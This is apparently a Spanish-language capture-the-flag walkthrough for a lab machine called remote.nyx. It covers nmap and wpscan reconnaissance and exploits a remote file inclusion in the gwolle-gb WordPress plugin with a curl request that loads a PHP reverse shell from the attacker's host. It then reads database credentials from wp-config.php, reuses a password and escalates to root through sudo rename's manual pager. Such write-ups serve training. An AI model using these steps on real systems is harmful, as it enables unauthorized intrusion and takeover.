Hola
Netdiscover, encontramos la ip 192.168.1.68

Primer nmap de reconocimiento de puertos:

nmap -p- -sS --open --min-rate 5000 -n -Pn 192.168.1.68

firstNmap.txt

Realizamos un segundo nmap más exhaustivo para sacar los servicios de los puertos

nmap -p 22,80 -sVC 192.168.1.68

secondNmap.txt

Http en el puerto 80, página web. Ejecutamos dirbuster mientras miramos la página

dirb http://192.168.1.68/

Página por defecto, revisamos el dirbuster y entramos a las diferentes páginas encontradas. Vemos la ruta de wordpress, por lo que miramos en la ruta principal y nos encontramos una web como esta

imagen_error

Revisando la web, vemos que nos redirecciona al clickar en diferentes espacios a remote.nyx, debido a que no lo tenemos contemplado, el navegador no sabe resolver dicho nombre a la ip correspondiente. Para esto, entramos en el archivo /etc/hosts y añadimos lo siguiente:

192.168.1.68	remote.nyx

Una vex heecho esto, recargamos:

imagen_ok

Revisando la página, lo más sencillo sería intentar colar un XSS o RCE a través de los cuadros de texto. No parece ser vulnerable a ello. Se poodría realizar una prueba de SQL injection en caso de que utilice alguna consulta de búsqueda de SQL, no parece ser el caso tampoco

Wordpress tiene la cualidad de tener plugins dentro del software que aunque la propia versión de wordpress no sea vulnerable, estos plugins sí pueden estar desactualizados y ser vulnerables. Debido a esto, vamos a revisar más a fondo el conjunto de plugins que tiene la página. Para esto, utilizamos wpscan:

wpscan --url http://remote.nyx/wordpress/ --enumerate p --plugins-detecion mixed

Este escáner nos da mucha información diferente, pero nos centraremos en los plugins ya que son los más susceptibles a ser vulnerados.

wpscan.txt

Como vemos en la salida, nos encontramos con dos plugins akismet con version 5.2 y gwolle-gb con version 1.5.3, revisando searchsploit, nos encontramos que la versión de gwolle-gb es vulnerable a un RFI (remote file inclusion)
Explicacion vulnerabilidad https://www.exploit-db.com/exploits/38861

El método busca un archivo wp-load.php, por lo que nos creamos una reverse shell en php para subir a nuestro servicio web, mientras tanto, nos quedamos escuchando a la web shell

Haciendo una consulta get a la url, con curl -s -X GET 'http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.1.103/' obtenemos la shell

Imagen whoami

EXPLICACION control TTY

Una vez dentro, con wl usuario www-data buscamos permisos en el sudoers, capabilities, permisos SUID, pero ninguno parece funcionar. Vamos a buscar credenciales en posibles archivos de configuracion dentro de wordpres. Realizando una pequeña búsqueda con 

find /var/www/html/ -name "*conf*" -type f 2>/dev/null

Encontramos varios archivos, uno en especial es /var/www/html/wordpress/wp-config.php, revisando dentro observamos posibles credenciales de un usuario root en la base de datos

imagen credentials root db

Probamos a entrar a mysql, ya que es la bd que se está utilizando

imagen mysql root

Entramos! Antes de mirar BBDD, podemos probar a entrar como tiago con la pass WPr00t3d123!


Entramos! Tenemos la flag de tiago

Ahora podemos escalar a root. Con sudo -l tenemos la opción de ejecutar como root /usr/bin/rename. Revisando las opciones del comando, nos encontramos con el parámetro -m, el cuál ejecuta el propio manual del comando. Aquí es dónde escalaremos a root, ya que dentro de los visualizadores de archivos con paginación como less, more, man o nano se pueden ejecutar comandos de shell. En este caso con el manual, es tan sencillo como ejecutar !/bin/bash y ya tendremos una shell como root







--Fallido--
Revisando demás directorios dentro de la web, nos encontramoos con una página de login. Probamos pass como admin:admin, sin éxito. De echo nos menciona que no existe usuario admin dentro de la web. Revisando, vemos que el blog es de un usuario "tiago", por lo que ya tenemos un usuario posible en la página que poder comprometer. Revisando más páginas encontramos http://remote.nyx/wordpress/index.php/pagina-ejemplo/, en el que encontramos posible información comprometida del usuario. Usando esto u otras wordlists para hacer un ataque de diccionario sobre la página, pero no parece funcionar.



